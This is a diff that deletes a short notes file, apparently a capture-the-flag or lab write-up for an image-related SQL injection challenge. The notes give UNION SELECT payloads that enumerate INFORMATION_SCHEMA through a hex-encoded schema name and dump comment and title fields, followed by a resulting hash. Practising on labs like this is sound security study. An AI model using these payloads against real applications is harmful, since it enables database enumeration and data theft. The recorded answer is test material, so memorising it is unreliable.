@@ -1,6 +1,0 @@
-sql injection get image
-get table name and column_name
-1 union select column_name, table_name from INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 0x4d656d6265725f53716c5f496e6a656374696f6e 
-get hash
-1 union select comment , title from Member_images.list_images 
-f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
